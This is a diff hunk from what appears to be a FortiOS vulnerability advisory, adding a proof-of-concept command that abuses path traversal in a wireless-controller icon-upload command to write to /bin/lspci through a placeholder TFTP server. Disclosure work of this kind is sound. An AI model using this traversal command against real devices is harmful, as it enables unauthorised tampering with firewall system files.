@@ -90,6 +90,12 @@ FortiOS versions 7.0.2 and below.
 
 Path traversal in execute command
 
+### poc
+
+```
+execute wireless-controller hs20-icon upload-icon tftp ../../../../../../bin/lspci <TA TFTP Server>
+```
+
 ### Affected Products
 
 FortiOS version 7.2.0 through 7.2.3
